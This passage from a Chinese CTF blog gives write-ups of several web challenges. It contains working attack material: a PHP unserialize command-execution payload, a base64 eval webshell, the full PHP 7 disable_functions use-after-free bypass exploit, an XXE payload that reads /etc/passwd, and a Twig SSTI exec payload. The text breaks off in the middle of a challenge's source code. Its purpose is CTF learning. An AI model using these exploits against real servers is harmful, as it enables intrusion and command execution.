$disable_fun = array(&amp;#34;exec&amp;#34;,&amp;#34;shell_exec&amp;#34;,&amp;#34;system&amp;#34;,&amp;#34;passthru&amp;#34;,&amp;#34;proc_open&amp;#34;,&amp;#34;show_source&amp;#34;,&amp;#34;phpinfo&amp;#34;,&amp;#34;popen&amp;#34;,&amp;#34;dl&amp;#34;,&amp;#34;eval&amp;#34;,&amp;#34;proc_terminate&amp;#34;,&amp;#34;touch&amp;#34;,&amp;#34;escapeshellcmd&amp;#34;,&amp;#34;escapeshellarg&amp;#34;,&amp;#34;assert&amp;#34;,&amp;#34;substr_replace&amp;#34;,&amp;#34;call_user_func_array&amp;#34;,&amp;#34;call_user_func&amp;#34;,&amp;#34;array_filter&amp;#34;, &amp;#34;array_walk&amp;#34;, &amp;#34;array_map&amp;#34;,&amp;#34;registregister_shutdown_function&amp;#34;,&amp;#34;register_tick_function&amp;#34;,&amp;#34;filter_var&amp;#34;, &amp;#34;filter_var_array&amp;#34;, &amp;#34;uasort&amp;#34;, &amp;#34;uksort&amp;#34;, &amp;#34;array_reduce&amp;#34;,&amp;#34;array_walk&amp;#34;, &amp;#34;array_walk_recursive&amp;#34;,&amp;#34;pcntl_exec&amp;#34;,&amp;#34;fopen&amp;#34;,&amp;#34;fwrite&amp;#34;,&amp;#34;file_put_contents&amp;#34;);
function gettime($func, $p) {
$result = call_user_func($func, $p);
$a= gettype($result);
if ($a == &amp;#34;string&amp;#34;) {
return $result;
} else {return &amp;#34;&amp;#34;;}
}
class Test {
var $p = &amp;#34;Y-m-d h:i:s a&amp;#34;;
var $func = &amp;#34;date&amp;#34;;
function __destruct() {
if ($this-&amp;gt;func != &amp;#34;&amp;#34;) {
echo gettime($this-&amp;gt;func, $this-&amp;gt;p);
}
}
}
$func = $_REQUEST[&amp;#34;func&amp;#34;];
$p = $_REQUEST[&amp;#34;p&amp;#34;];
if ($func != null) {
$func = strtolower($func);
if (!in_array($func,$disable_fun)) {
echo gettime($func, $p);
}else {
die(&amp;#34;Hacker...&amp;#34;);
}
}
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;我没思路了，看的网上wp。使用了反序列化unserialize，实在是太斯巴拉西了。&lt;/p&gt;
&lt;p&gt;先构造Test对象，对象销毁时也会执行gettime函数执行payload，记得要加一层urlencode，不然会被拦下&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;&amp;lt;?php
class Test {
var $p = &amp;#34;ls ../../../../&amp;#34;;
var $func = &amp;#34;system&amp;#34;;
}
$s=new Test();
echo urlencode(serialize($s));
#unserialize
O%3A4%3A%22Test%22%3A2%3A%7Bs%3A1%3A%22p%22%3Bs%3A15%3A%22ls+..%2F..%2F..%2F..%2F%22%3Bs%3A4%3A%22func%22%3Bs%3A6%3A%22system%22%3B%7D
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;wp使用的是find指令找的flag地址，但是我执行以后出现503，应该是服务器防火墙阳气过盛，但是使用ls的方法一个一个找也能找得到。flag在/tmp/flagoefiu4r93&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;POST
func=unserialize&amp;amp;p=O%3A4%3A%22Test%22%3A2%3A%7Bs%3A1%3A%22p%22%3Bs%3A18%3A%22ls+..%2F..%2F..%2F..%2Ftmp%22%3Bs%3A4%3A%22func%22%3Bs%3A6%3A%22system%22%3B%7D
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;最后读文件&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;func=readfile&amp;amp;p=../../../../tmp/flagoefiu4r93
&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
&lt;h1 id="gkctf2020checkin"&gt;[GKCTF2020]CheckIN
&lt;/h1&gt;&lt;p&gt;是用base64解码执行代码，使用Ginkgo接收，GET、POST都可以&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;phpinfo();
cGhwaW5mbygpOw==
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;查看php版本和disable_function，被禁用一大堆，包括好多命令执行函数&lt;/p&gt;
&lt;p&gt;可以使用print_r()、var_dump()输出，scandir()看目录，file_get_contents()读文件内容。&lt;/p&gt;
&lt;p&gt;scandir根目录查看&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;?Ginkgo=cHJpbnRfcihzY2FuZGlyKCcuLi8uLi8uLi8uLi8nKSk7
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;又一个flag读不出来，但是还有一个readflag可以读出来，文件前缀是ELF，百度以后知道是linux的可执行文件&lt;/p&gt;
&lt;p&gt;传码&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;eval($_POST[1]);
ZXZhbCgkX1BPU1RbMV0pOw==
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;蚁剑连接。但是system()被禁，只能使用disable_function绕过，之前有一道&lt;a class="link" href="https://braindance.tk/2020/%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DRCE%20ME/" target="_blank" rel="noopener"
&gt;RCE ME&lt;/a&gt;也是用绕过，但是在这道题不管用了。在网上看wp知道了另一种，利用php7堆溢出触发，我修改了下payload部分(11行)：&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;&amp;lt;?php
# PHP 7.0-7.3 disable_functions bypass PoC (*nix only)
#
# Bug: https://bugs.php.net/bug.php?id=72530
#
# This exploit should work on all PHP 7.0-7.3 versions
#
# Author: https://github.com/mm0r1
pwn(&amp;#34;../../.././readflag&amp;#34;); #这里是想要执行的命令
function pwn($cmd) {
global $abc, $helper;
function str2ptr(&amp;amp;$str, $p = 0, $s = 8) {
$address = 0;
for($j = $s-1; $j &amp;gt;= 0; $j--) {
$address &amp;lt;&amp;lt;= 8;
$address |= ord($str[$p+$j]);
}
return $address;
}
function ptr2str($ptr, $m = 8) {
$out = &amp;#34;&amp;#34;;
for ($i=0; $i &amp;lt; $m; $i++) {
$out .= chr($ptr &amp;amp; 0xff);
$ptr &amp;gt;&amp;gt;= 8;
}
return $out;
}
function write(&amp;amp;$str, $p, $v, $n = 8) {
$i = 0;
for($i = 0; $i &amp;lt; $n; $i++) {
$str[$p + $i] = chr($v &amp;amp; 0xff);
$v &amp;gt;&amp;gt;= 8;
}
}
function leak($addr, $p = 0, $s = 8) {
global $abc, $helper;
write($abc, 0x68, $addr + $p - 0x10);
$leak = strlen($helper-&amp;gt;a);
if($s != 8) { $leak %= 2 &amp;lt;&amp;lt; ($s * 8) - 1; }
return $leak;
}
function parse_elf($base) {
$e_type = leak($base, 0x10, 2);
$e_phoff = leak($base, 0x20);
$e_phentsize = leak($base, 0x36, 2);
$e_phnum = leak($base, 0x38, 2);
for($i = 0; $i &amp;lt; $e_phnum; $i++) {
$header = $base + $e_phoff + $i * $e_phentsize;
$p_type = leak($header, 0, 4);
$p_flags = leak($header, 4, 4);
$p_vaddr = leak($header, 0x10);
$p_memsz = leak($header, 0x28);
if($p_type == 1 &amp;amp;&amp;amp; $p_flags == 6) { # PT_LOAD, PF_Read_Write
# handle pie
$data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;
$data_size = $p_memsz;
} else if($p_type == 1 &amp;amp;&amp;amp; $p_flags == 5) { # PT_LOAD, PF_Read_exec
$text_size = $p_memsz;
}
}
if(!$data_addr || !$text_size || !$data_size)
return false;
return [$data_addr, $text_size, $data_size];
}
function get_basic_funcs($base, $elf) {
list($data_addr, $text_size, $data_size) = $elf;
for($i = 0; $i &amp;lt; $data_size / 8; $i++) {
$leak = leak($data_addr, $i * 8);
if($leak - $base &amp;gt; 0 &amp;amp;&amp;amp; $leak - $base &amp;lt; $data_addr - $base) {
$deref = leak($leak);
# &amp;#39;constant&amp;#39; constant check
if($deref != 0x746e6174736e6f63)
continue;
} else continue;
$leak = leak($data_addr, ($i + 4) * 8);
if($leak - $base &amp;gt; 0 &amp;amp;&amp;amp; $leak - $base &amp;lt; $data_addr - $base) {
$deref = leak($leak);
# &amp;#39;bin2hex&amp;#39; constant check
if($deref != 0x786568326e6962)
continue;
} else continue;
return $data_addr + $i * 8;
}
}
function get_binary_base($binary_leak) {
$base = 0;
$start = $binary_leak &amp;amp; 0xfffffffffffff000;
for($i = 0; $i &amp;lt; 0x1000; $i++) {
$addr = $start - 0x1000 * $i;
$leak = leak($addr, 0, 7);
if($leak == 0x10102464c457f) { # ELF header
return $addr;
}
}
}
function get_system($basic_funcs) {
$addr = $basic_funcs;
do {
$f_entry = leak($addr);
$f_name = leak($f_entry, 0, 6);
if($f_name == 0x6d6574737973) { # system
return leak($addr + 8);
}
$addr += 0x20;
} while($f_entry != 0);
return false;
}
class ryat {
var $ryat;
var $chtg;
function __destruct()
{
$this-&amp;gt;chtg = $this-&amp;gt;ryat;
$this-&amp;gt;ryat = 1;
}
}
class Helper {
public $a, $b, $c, $d;
}
if(stristr(PHP_OS, &amp;#39;WIN&amp;#39;)) {
die(&amp;#39;This PoC is for *nix systems only.&amp;#39;);
}
$n_alloc = 10; # increase this value if you get segfaults
$contiguous = [];
for($i = 0; $i &amp;lt; $n_alloc; $i++)
$contiguous[] = str_repeat(&amp;#39;A&amp;#39;, 79);
$poc = &amp;#39;a:4:{i:0;i:1;i:1;a:1:{i:0;O:4:&amp;#34;ryat&amp;#34;:2:{s:4:&amp;#34;ryat&amp;#34;;R:3;s:4:&amp;#34;chtg&amp;#34;;i:2;}}i:1;i:3;i:2;R:5;}&amp;#39;;
$out = unserialize($poc);
gc_collect_cycles();
$v = [];
$v[0] = ptr2str(0, 79);
unset($v);
$abc = $out[2][0];
$helper = new Helper;
$helper-&amp;gt;b = function ($x) { };
if(strlen($abc) == 79 || strlen($abc) == 0) {
die(&amp;#34;UAF failed&amp;#34;);
}
# leaks
$closure_handlers = str2ptr($abc, 0);
$php_heap = str2ptr($abc, 0x58);
$abc_addr = $php_heap - 0xc8;
# fake value
write($abc, 0x60, 2);
write($abc, 0x70, 6);
# fake reference
write($abc, 0x10, $abc_addr + 0x60);
write($abc, 0x18, 0xa);
$closure_obj = str2ptr($abc, 0x20);
$binary_leak = leak($closure_handlers, 8);
if(!($base = get_binary_base($binary_leak))) {
die(&amp;#34;Couldn&amp;#39;t determine binary base address&amp;#34;);
}
if(!($elf = parse_elf($base))) {
die(&amp;#34;Couldn&amp;#39;t parse ELF header&amp;#34;);
}
if(!($basic_funcs = get_basic_funcs($base, $elf))) {
die(&amp;#34;Couldn&amp;#39;t get basic_functions address&amp;#34;);
}
if(!($zif_system = get_system($basic_funcs))) {
die(&amp;#34;Couldn&amp;#39;t get zif_system address&amp;#34;);
}
# fake closure object
$fake_obj_offset = 0xd0;
for($i = 0; $i &amp;lt; 0x110; $i += 8) {
write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));
}
# pwn
write($abc, 0x20, $abc_addr + $fake_obj_offset);
write($abc, 0xd0 + 0x38, 1, 4); # internal func type
write($abc, 0xd0 + 0x68, $zif_system); # internal func handler
($helper-&amp;gt;b)($cmd);
exit();
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;在蚁剑可以看出tmp文件夹权限可以上传，上传以后使用文件包含输出执行结果。文件包含payload&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;?Ginkgo=aW5jbHVkZSgnL3RtcC9waHA3LWdjLWJ5cGFzcy5waHAnKTs=
&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
&lt;h1 id="0302"&gt;03.02
&lt;/h1&gt;&lt;hr&gt;
&lt;h1 id="nctf2019fake-xml-cookbook"&gt;[NCTF2019]Fake XML cookbook
&lt;/h1&gt;&lt;p&gt;根据题目是XML，首先想到是XXE，虽然咱没学过但是可以去搜简单的payload。&lt;/p&gt;
&lt;p&gt;使用bp抓个包，POST中传入的是标签格式，可以确定是XXE类型的题目&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;POST
Content-Type: application/xml;
&amp;lt;user&amp;gt;&amp;lt;username&amp;gt;1&amp;lt;/username&amp;gt;&amp;lt;password&amp;gt;2&amp;lt;/password&amp;gt;&amp;lt;/user&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;去摸一个payload试试&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;utf-8&amp;#34;?&amp;gt;
&amp;lt;!DOCTYPE test [
&amp;lt;!ENTITY admin SYSTEM &amp;#34;file:///etc/passwd&amp;#34;&amp;gt;
]&amp;gt;
&amp;lt;user&amp;gt;&amp;lt;username&amp;gt;&amp;amp;admin;&amp;lt;/username&amp;gt;&amp;lt;password&amp;gt;123456&amp;lt;/password&amp;gt;&amp;lt;/user&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;成功读取文件&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210302110439.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;把路径改为/flag，获得flag&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id="asis-2019unicorn-shop"&gt;[ASIS 2019]Unicorn shop
&lt;/h1&gt;&lt;p&gt;这道题绝活。学到了unicode的安全问题：&lt;a class="link" href="https://xz.aliyun.com/t/5402" target="_blank" rel="noopener"
&gt;浅谈Unicode设计的安全性&lt;/a&gt;，看了wp。&lt;/p&gt;
&lt;p&gt;进入网站一个本杰明·富兰克林至理名言：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;金钱从来不会使人幸福，也不会使人幸福；它的本性中没有任何东西可以产生幸福。幸福拥有的越多，想要的就越多&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;&lt;del&gt;差点信了，我就要赚钱花(小声bb)&lt;/del&gt;&lt;/p&gt;
&lt;p&gt;下面两个输入框，一个ID一个钱，上面一个独角兽商品列表，一看就是让买东西，但是1-3商品输入ID都提示错误，只有第四个可以买到，但是第四个输入钱的时候只能输入1位，然鹅4号价格是1377，显然买不到，输入多个又提示 ，所以思路就是找一个unicode字符，它的数字格式值是大于1377的。&lt;/p&gt;
&lt;p&gt;一个和unicode有关的网站：https://www.compart.com/en/unicode&lt;/p&gt;
&lt;p&gt;网站导航栏找到Character Categories分类，这个下有三个和数相关的：Decimal Number、Letter Number、Other Number，第一个里面都是正常数值的unicode，建议去后面两个找。怎么找：&lt;code&gt;Ctrl+F&lt;/code&gt;搜索thousand，找1377以上的都可。&lt;/p&gt;
&lt;p&gt;我选的是这个&lt;code&gt;፼&lt;/code&gt;数值是1w，直接传传不过去，使用url编码一次再传。&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210302113544.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id="bjdctf2020cookie-is-so-stable"&gt;[BJDCTF2020]Cookie is so stable
&lt;/h1&gt;&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210304092035.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;这道题和The mystery of ip的网站一样，还有可能是ssti，hint.php的注释里有&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Why not take a closer look at cookies?&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;去flag.php提交个1之后，看cookie为&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;Cookie: PHPSESSID=dba9ac7cbddf1983cbac508b01f8cdf2; user=1
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;一目了然，接下来就是找payload。再使用之前的&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;{system(&amp;#39;cat /flag&amp;#39;)}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;被拦下来了，说明加强了过滤。在这之后去看了wp，网上的wp都是直接给出了payload&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;{{_self.env.registerUndefinedFilterCallback(&amp;#34;exec&amp;#34;)}}{{_self.env.getFilter(&amp;#34;whoami&amp;#34;)}}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;我是受了这位师傅的&lt;a class="link" href="https://www.cnblogs.com/bmjoker/p/13508538.html" target="_blank" rel="noopener"
&gt;文章&lt;/a&gt;启发，又去结合了下这道题的&lt;a class="link" href="https://github.com/BjdsecCA/BJDCTF2020_January/tree/f73ac63336d9161d3c91354ce3eac943c403d4fb/Web/ssti_twig" target="_blank" rel="noopener"
&gt;源码&lt;/a&gt;才搞明白。&lt;/p&gt;
&lt;p&gt;这道题在渲染之前使用了twig模板：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Twig是来自于Symfony的模板引擎，它非常易于安装和使用。它的操作有点像Mustache和liquid。Twig使用一个加载器 loader(Twig_Loader_Array) 来定位模板，以及一个环境变量 environment(Twig_Environment) 来存储配置信息。其中，render() 方法通过其第一个参数载入模板，并通过第二个参数中的变量来渲染模板。&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;我同样在题目的源码中找到了&lt;code&gt;render()&lt;/code&gt;方法和&lt;code&gt;Twig_Environment&lt;/code&gt;配置信息&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210302160322.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;然后payload的具体原理在的&lt;code&gt;Environment.php&lt;/code&gt;中,贴一下和payload相关部分：&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210302160722.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;先执行&lt;code&gt;{{_self.env.registerUndefinedFilterCallback(&amp;quot;exec&amp;quot;)}}&lt;/code&gt;调用了&lt;code&gt;registerUndefinedFilterCallback()&lt;/code&gt;函数(图中884行)，注册了一个未定义的函数到&lt;code&gt;filterCallbacks&lt;/code&gt;全局变量中&lt;/li&gt;
&lt;li&gt;接着执行&lt;code&gt;{{_self.env.getFilter(&amp;quot;whoami&amp;quot;)}}&lt;/code&gt;调用了&lt;code&gt;getFilter()&lt;/code&gt;函数，并传入变量&lt;code&gt;$name&lt;/code&gt;值为执行的命令，当函数执行到图中代码875行时，进入循环执行了&lt;code&gt;call_user_func()&lt;/code&gt;，这个函数大伙肯定不陌生：call_user_func 可以把第一个参数作为回调函数调用，调用的参数来源就是第一步中注册的&lt;code&gt;filterCallbacks&lt;/code&gt;全局变量，里边已经躺好了一个刚刚注册的&lt;code&gt;exec&lt;/code&gt;，至此就形成了payload&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;h1 id="小彩蛋"&gt;小彩蛋
&lt;/h1&gt;&lt;p&gt;现在(2021年3月2日16:32:44)刚好做完题，想回到BUU上整理过程，发现502了，然后去群里就看到了&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210302163452.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210302163636.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;挺草的记一下。&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id="ciscn-2019-初赛love-math"&gt;[CISCN 2019 初赛]Love Math
&lt;/h1&gt;&lt;p&gt;源码：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;&amp;lt;?&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;php&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#a6e22e"&gt;error_reporting&lt;/span&gt;(&lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;//听说你很喜欢数学，不知道你是否爱它胜过爱flag
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;&lt;/span&gt;&lt;span style="color:#66d9ef"&gt;if&lt;/span&gt;(&lt;span style="color:#f92672"&gt;!&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;isset&lt;/span&gt;($_GET[&lt;span style="color:#e6db74"&gt;&amp;#39;c&amp;#39;&lt;/span&gt;])){
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;show_source&lt;/span&gt;(&lt;span style="color:#66d9ef"&gt;__FILE__&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}&lt;span style="color:#66d9ef"&gt;else&lt;/span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#75715e"&gt;//例子 c=20-1
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;&lt;/span&gt; $content &lt;span style="color:#f92672"&gt;=&lt;/span&gt; $_GET[&lt;span style="color:#e6db74"&gt;&amp;#39;c&amp;#39;&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (&lt;span style="color:#a6e22e"&gt;strlen&lt;/span&gt;($content) &lt;span style="color:#f92672"&gt;&amp;gt;=&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;80&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;die&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;太长了不会算&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $blacklist &lt;span style="color:#f92672"&gt;=&lt;/span&gt; [&lt;span style="color:#e6db74"&gt;&amp;#39; &amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;\t&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;\r&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;\n&amp;#39;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#39;\&amp;#39;&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;&amp;#34;&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;`&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;\[&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;\]&amp;#39;&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;foreach&lt;/span&gt; ($blacklist &lt;span style="color:#66d9ef"&gt;as&lt;/span&gt; $blackitem) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (&lt;span style="color:#a6e22e"&gt;preg_match&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;/&amp;#39;&lt;/span&gt; &lt;span style="color:#f92672"&gt;.&lt;/span&gt; $blackitem &lt;span style="color:#f92672"&gt;.&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;/m&amp;#39;&lt;/span&gt;, $content)) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;die&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;请不要输入奇奇怪怪的字符&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#75715e"&gt;//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;&lt;/span&gt; $whitelist &lt;span style="color:#f92672"&gt;=&lt;/span&gt; [&lt;span style="color:#e6db74"&gt;&amp;#39;abs&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;acos&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;acosh&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;asin&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;asinh&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;atan2&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;atan&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;atanh&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;base_convert&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;bindec&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;ceil&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;cos&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;cosh&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;decbin&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;dechex&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;decoct&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;deg2rad&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;exp&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;expm1&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;floor&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;fmod&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;getrandmax&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;hexdec&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;hypot&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;is_finite&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;is_infinite&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;is_nan&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;lcg_value&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;log10&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;log1p&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;log&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;max&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;min&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;mt_getrandmax&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;mt_rand&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;mt_srand&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;octdec&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;pi&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;pow&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;rad2deg&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;rand&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;round&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;sin&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;sinh&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;sqrt&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;srand&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;tan&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;tanh&amp;#39;&lt;/span&gt;];
